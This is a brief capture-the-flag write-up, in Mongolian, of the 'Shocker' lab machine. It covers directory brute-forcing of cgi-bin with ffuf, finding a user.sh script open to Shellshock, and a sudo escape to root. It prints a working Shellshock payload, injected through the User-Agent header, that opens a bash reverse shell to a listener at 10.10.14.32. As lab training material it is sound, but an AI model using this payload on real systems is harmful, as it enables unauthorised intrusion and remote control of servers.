# Shocker - CGI-bin Shellshock

cgi-bin directory байгаа тул sh,cgi,pl өргөтгөлтэй url-уудыг хайсан байгаа.

[image]

ffuf түүлээр dir bruteforce хийхэд user.sh directory result хэсэг дээр гарч ирлээ.

[image]

user.sh хэсэг нь cgi-bin shellshock халдлагад өртөмтгий байдаг.

[image]

Тухайн user.sh-ийг burpsuite-ээр inspect хийгээд user-agent дээр нь дараах байдлаар reverse shell хийх юм.

```bash
() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/1313 0>&1'
```

[image]

Boom

[image]

Sudo shell escape Linux privilege

[image]

Root!!!

[image]
